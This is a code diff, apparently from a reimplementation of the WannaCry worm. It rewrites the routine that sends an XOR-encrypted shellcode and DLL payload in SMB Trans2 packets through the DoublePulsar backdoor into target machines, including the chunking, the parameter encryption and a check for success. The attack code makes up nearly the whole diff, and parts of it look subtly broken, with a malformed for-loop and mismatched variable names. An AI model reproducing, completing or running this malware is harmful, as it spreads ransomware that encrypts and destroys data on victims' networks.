@@ -256,17 +256,30 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h
 	*/
 	
-	int ctx;
-	char signature[9];
+	int ctx = 0; //offset counter
+	char Parametersbuffer[12];
+	
+	//the payload size doesn't change, but this is determined by the shellcode + DLL payload
+	//change this to dynamically change based on the size of the payload
+	unsigned int xor_payload_size = 0x507308 ^ xkey; 
+	unsigned int chunk_size = 4096 ^ xkey; //chunk size but encrypted with XOR key
+	unsigned int o_offset = 0 ^ xkey; //offset counter but encrypted with XOR key
+	unsigned int bytesLeft = xor_payload_size; //Bytes Left counter
 	if(total_size / 4096 > 0)
 	{
 		for(i=0; ctx=i)
 		{
-			//loop through the packets
-			//signature = __PAIR__(4096, UNK); //UNK = totalsize?
-			//*(DWORD *)&signature[8] = ctx;
-			xor_payload(xkey, signature, 12);
-			memcpy(send_buffer, (char *)hMem + ctx, 4096);
+			o_offset = ctx ^ xkey;
+			memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
+			memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
+			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
+			
+			//size 70
+			memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
+			//copy parameters
+			memcpy(send_buffer + 70 , Parametersbuffer, 12);
+			//copy 4096 bytes of payload
+			memcpy(send_buffer + 82, (char *)hMem + ctx, 4096);
 			send(socket, (char*)send_buffer, 4178, 0);
 			recv(socket, (char*)recv_buffer, 4096, 0);
 			if(recvbuff[34] != 82)
@@ -274,15 +287,43 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 				//error, doublePulsar should return 82
 				break;
 			}
-			ctx += 4096;
+			ctx += 4096; //increment counter 
+			bytesleft -= 4096; //tracker to see how many bytes we have left
 		}
 	}
 	
 	if ( v10 > 0 )
 	{
-		v25 = htons(v10+78);
-		xor_payload(xkey, session_parameters, 12);
+		//update chunk size to what's left in the encrypted payload buffer
+		chunk_size = bytesLeft ^ xkey;
+		//update offset by XORing the latest value
+		o_offset = ctx ^ xkey;
+		memcpy(Parametersbuffer, (char*)&xor_payload_size, 4);
+		memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
+		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
+		//parameters are copied accurately to the buffer
+		
+		//size 70
+		memcpy(send_buffer, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));
+		//update last packet SMB Length
+		smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
+		memcpy(send_buffer+3, &smblen, 1);
+
+		//copy parameters
+		memcpy(send_buffer + 70 , Parametersbuffer, 12);
+		//copy last payload size = bytesLeft
+		memcpy(send_buffer + 82, (char *)hMem + ctx, bytesLeft);
+		send(socket, (char*)send_buffer, 4178, 0);
+		recv(socket, (char*)recv_buffer, 4096, 0);
 	}
+	//This part of the code is for debug purposes
+	if(recvbuff[34] == 82)
+	{
+			//DEBUG PURPOSE ONLY
+			printf("Doublepulsar ran successfully!\n");
+	}
+	/////////////////////////////////////////////
+	GlobalFree(hMem);
 }
 
 int runPayloadOnTarget(char *host, u_short hostshort)
